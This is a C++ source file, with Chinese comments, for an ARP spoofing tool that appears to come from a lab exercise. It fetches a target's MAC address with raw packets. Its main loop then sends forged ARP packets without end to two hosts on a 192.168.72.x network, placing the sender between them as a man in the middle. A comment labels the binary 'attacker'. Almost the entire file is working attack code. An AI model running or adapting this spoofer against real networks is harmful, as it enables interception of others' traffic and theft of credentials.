#include <cstdio>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <unistd.h>
#include <sys/types.h>
#include <ifaddrs.h>
using namespace std;

// 链路层数据包格式
typedef struct {
    u_char DestMac[6];
    u_char SrcMac[6];
    u_char Etype[2];
} ETHHEADER;

// IP层数据包格式
typedef struct {
    int header_len:4;
    int version:4;
    u_char tos:8;
    int total_len:16;
    int ident:16;
    int flags:16;
    u_char ttl:8;
    u_char proto:8;
    int checksum:16;
    u_char sourceIP[4];
    u_char destIP[4];
} IPHEADER;

// 协议映射表
char *Proto[]={
    "Reserved","ICMP","IGMP","GGP","IP","ST","TCP"
};
//获取本机MAC地址，存入mac数组中，要求传入网卡名字
int getMacAddr(unsigned char mac[], const char name[])
{
    struct ifreq ethinfo;
    int sock_fd;
    if (name == NULL || mac == NULL) {
        return -1;
    }

    if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Open Socket");
        return -1;
    }

    strcpy(ethinfo.ifr_name, name);

    if (ioctl(sock_fd, SIOCGIFHWADDR, &ethinfo) < 0) {
        perror("Ioctl");
        return -1;
    }
    
    for (int i = 0; i < 6; ++i) {
        mac[i] = (unsigned char)ethinfo.ifr_hwaddr.sa_data[i];
    }

    close(sock_fd);

    return 1;
}

//构建ARP数据包
void packarp(unsigned char *mymac, unsigned char *tarmac, unsigned int *tarip, unsigned int *myip, unsigned char *opcode, unsigned char *arppack) {
    // ARP 的固定部分
    unsigned char eth_type[2] = {0x00, 0x01};   // 硬件类型，以太网为 1
    unsigned char por_type[2] = {0x08, 0x00};    // ARP 协议类型，IP 协议为 0x0800
    unsigned char arp_type[2] = {0x08, 0x06};    // ARP 帧类型，0x0806 表示 ARP
    unsigned char eth_length = 6;                 // 硬件地址长度（MAC 地址的字节数）
    unsigned char por_length = 4;                 // 协议地址长度（IP 地址的字节数）

    // 清空 ARP 包缓存
    memset(arppack, 0, 42); 

    // ARP 包填充顺序
    memcpy(arppack, tarmac, 6);           // 目标 MAC 地址
    memcpy(arppack + 6, mymac, 6);        // 源 MAC 地址
    memcpy(arppack + 12, arp_type, 2);    // ARP 类型（0x0806）
    memcpy(arppack + 14, eth_type, 2);    // 硬件类型（0x0001，以太网）
    memcpy(arppack + 16, por_type, 2);    // 协议类型（0x0800，表示 IP 协议）
    memcpy(arppack + 18, &eth_length, 1); // 硬件地址长度（6）
    memcpy(arppack + 19, &por_length, 1); // 协议地址长度（4）
    memcpy(arppack + 20, opcode, 2);      // 操作码（0x0001: 请求；0x0002: 响应）
    
    // 发送者 MAC 地址和 IP 地址
    memcpy(arppack + 22, mymac, 6);          // 发送者 MAC 地址
    memcpy(arppack + 28, myip, 4);           // 发送者 IP 地址
    memcpy(arppack + 32, tarmac, 6);    	 // 目标 MAC 地址
    memcpy(arppack + 38, tarip, 4);          // 目标 IP 地址
}
// ARP 数据包结构
void parse_arp_packet(unsigned char *packet) {
    // ARP 数据包格式
    // (硬件类型、协议类型、硬件地址长度、协议地址长度、操作码、发送者MAC、发送者IP、目标MAC、目标IP)
    
    // 提取操作码（第 20 和 21 字节）
    unsigned short opcode = (packet[20] << 8) | packet[21];  // 操作码（16 位）

    // 获取源 MAC 地址（第 22 到 27 字节）
    unsigned char *sender_mac = (unsigned char *)(packet + 22);

    // 获取源 IP 地址（第 28 到 31 字节）
    unsigned int sender_ip = (packet[28] << 24) | (packet[29] << 16) | (packet[30] << 8) | packet[31];

    // 获取目标 MAC 地址（第 32 到 37 字节）
    unsigned char *target_mac = (unsigned char *)(packet + 32);

    // 获取目标 IP 地址（第 38 到 41 字节）
    unsigned int target_ip = (packet[38] << 24) | (packet[39] << 16) | (packet[40] << 8) | packet[41];

    // 打印包内容
    printf("ARP 操作码: 0x%04x\n", opcode);
    printf("源 MAC 地址: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           sender_mac[0], sender_mac[1], sender_mac[2], 
           sender_mac[3], sender_mac[4], sender_mac[5]);
    printf("源 IP 地址: %d.%d.%d.%d\n", 
           (sender_ip >> 24) & 0xFF, (sender_ip >> 16) & 0xFF, 
           (sender_ip >> 8) & 0xFF, sender_ip & 0xFF);
    printf("目标 MAC 地址: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           target_mac[0], target_mac[1], target_mac[2], 
           target_mac[3], target_mac[4], target_mac[5]);
    printf("目标 IP 地址: %d.%d.%d.%d\n", 
           (target_ip >> 24) & 0xFF, (target_ip >> 16) & 0xFF, 
           (target_ip >> 8) & 0xFF, target_ip & 0xFF);

    // 判断操作码
    if (opcode == 0x0001) {
        printf("这是一个 ARP 请求包\n");
    } else if (opcode == 0x0002) {
        printf("这是一个 ARP 响应包\n");
    } else {
        printf("未知的 ARP 操作码: 0x%04x\n", opcode);
    }
}
bool arp(char dev[],char srcip[],char dstip[]){
    unsigned char mymac[6] = {0};
    unsigned char tarmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char recvarp[42] = {0};
    unsigned char sendarp[42] = {0};
    unsigned int tarip;
    unsigned int myip;
    unsigned char opcode[2];
    int sock_fd;
    struct sockaddr addr;


    //获取本机MAC地址
    if (getMacAddr(mymac, dev) < 0) {
        printf("获取MAC地址失败\n");
        return EXIT_FAILURE;
    }
    
    myip = inet_addr(srcip);
    tarip = inet_addr(dstip);
    opcode[0] = 0x00;
    opcode[1] = 0x01;

    //进行ARP数据打包，用于获取接收方mac地址
    packarp(mymac, tarmac, &tarip, &myip, opcode, sendarp);
	
    //准备socket通讯
    if ((sock_fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
        perror("Open Socket");
        return EXIT_FAILURE;
    }

    memset(&addr, 0, sizeof(addr));
    strncpy(addr.sa_data, dev, sizeof(addr.sa_data));
    socklen_t len = sizeof(addr);

    //获取接收方mac地址
	printf("正在获取目标MAC地址...\n");
    while(1) {
        if (sendto(sock_fd, sendarp, 42, 0, &addr, len) == 42) {
			putchar('>');
        } else {
            perror("sendto");
            return EXIT_FAILURE;
        }
		
        // sudo ./attacker
        if (recvfrom(sock_fd, recvarp, 42, 0, &addr, &len) == 42) {
            if (!memcmp((void *)recvarp + 32, (void *)sendarp + 22, 4)) {
                memcpy(tarmac, recvarp + 22, 6);
                printf("\n获取目标MAC地址:");
				printf(" %02x:%02x:%02x:%02x:%02x:%02x成功\n", 
				recvarp[22], recvarp[23], recvarp[24], 
				recvarp[25], recvarp[26], recvarp[27]);
                break;
            }
        }
        
        sleep(1);
    }
    //进行ARP数据打包，用于进行ARP欺骗
    opcode[0] = 0x00;
    opcode[1] = 0x01;
    packarp(mymac, tarmac, &tarip, &myip, opcode, sendarp);
	printf("正在进行ARP欺骗...\n");
    for(int i=1;i<=3;i++) {
        if (sendto(sock_fd, sendarp, 42, 0, &addr, len) == 42) {
            putchar('>');
        } else {
            perror("sendto");
            return EXIT_FAILURE;
        }
        sleep(1);
    }
	putchar('\n');
	printf("已完成%s->%s的欺骗\n\n",srcip,dstip);
    close(sock_fd);
    
    return EXIT_SUCCESS;
}

int main() {
    char clientIP[]={"192.168.72.132"},serverIP[]={"192.168.72.130"},dev[]={"ens33"};
    while(1){
        if(arp(dev,serverIP,clientIP)==-1) break;
        if(arp(dev,clientIP,serverIP)==-1) break;
    }
    

    
    
    return 0;
}
